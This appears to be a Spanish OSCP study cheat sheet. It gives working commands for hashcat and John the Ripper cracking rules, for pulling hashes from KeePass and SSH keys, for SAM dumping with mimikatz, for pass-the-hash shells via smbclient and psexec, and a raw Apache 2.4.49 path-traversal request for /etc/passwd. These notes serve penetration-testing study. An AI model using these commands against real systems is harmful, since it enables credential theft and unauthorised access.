
## Password attacks

  Crear una regla para hashcat que añada '1@3$5' al final de cada contraseña:

    └─# cat demo.rule
    $1 $@ $3 $$ $5

  Utilizamos la regla para crackear el hash MD5:

    hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r demo.rule

  Crear una regla para convertir todo a mayúsculas con 'u' y duplicar cada palabara 'd':

    └─# cat demo2.rules 
    u d

  Ejecutamos el ataque:

    └─# hashcat -m 0 hash2.txt /usr/share/wordlists/rockyou.txt -r demo2.rules

  Conseguimos la contraseña:

    19adc0e8921336d08502c039dc297ff8:<REDACTED>

  Reglas de contraseñas:

    https://hashcat.net/wiki/doku.php?id=rule_based_attack

### Keepass

  Buscamos por archivos de Keepass:

    Get-ChildItem -Path C: -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

  Nos transferimos el archivo a nuestro local y sacamos el hash con keepass2john:

    └─# keepass2john Database.kdbx > keepass.hash

  Lanzamos hashcat con la regla /rockyou-30000.rule para crackear la contraseña:

    └─# hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

### id_rsa

  Para sacar el hash de una clave privada id_rsa:

    ssh2john id_rsa > ssh.hash

  Para pasar las reglas a JTR, tenemos que modificar el archivo custom.rule:

    └─# cat custom.rule 
    [List.Rules:sshRules]
    c $1 $3 $7 $@
    c $1 $3 $7 $$
    c $1 $3 $7 $#

    sh -c 'cat custom.rule >> /etc/john/john.conf'

  Y corremos JTR:

    └─# john --wordlist=ssh.passwords --rules=sshRules ssh_hash

### NTLM

  Si tenemos privilegios de Administador en una máquina Windows, ejecutamos el comando para ver otros usuarios en el sistema a través de PowerShell:

    Get-LocalUser

  Una vez localicemos los nuevos usuarios, corremos mimikatz y ejecutamos:

    privilege::debug

  Con este comando activamos el permiso 'SeDebugPrivilege' que es necesario para este ataque. Después, lanzamos:

    token::elevate

  Para elevar privilegios a SISTEMA.

  Finalmente, para obtener los hashes:

    lsadump::sam

Una vez tenemos el hash, buscamos en hashcat el modo de crackeo:

![image](https://github.com/loqasto/OSCP/assets/111526713/f9b028e5-0d0e-4e5a-a8f0-1156c3ac3d84)

En este caso, el modo es 1000, por lo tanto:

    └─# hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt

Y obtenemos la contraseña en texto plano.

### PassTheHash

  Conectar a compartido por smbclient con PtH:

    smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

  Obtener shell con psexec a través de PtH:

    impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212



## Vulnerabilidades conocidas

  Apache HTTP Server 2.4.49 - Path traversal

    GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
    Host: https://www.twitter.com/vulnmachines
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Pragma: no-cache
    Cache-Control: no-cache

    
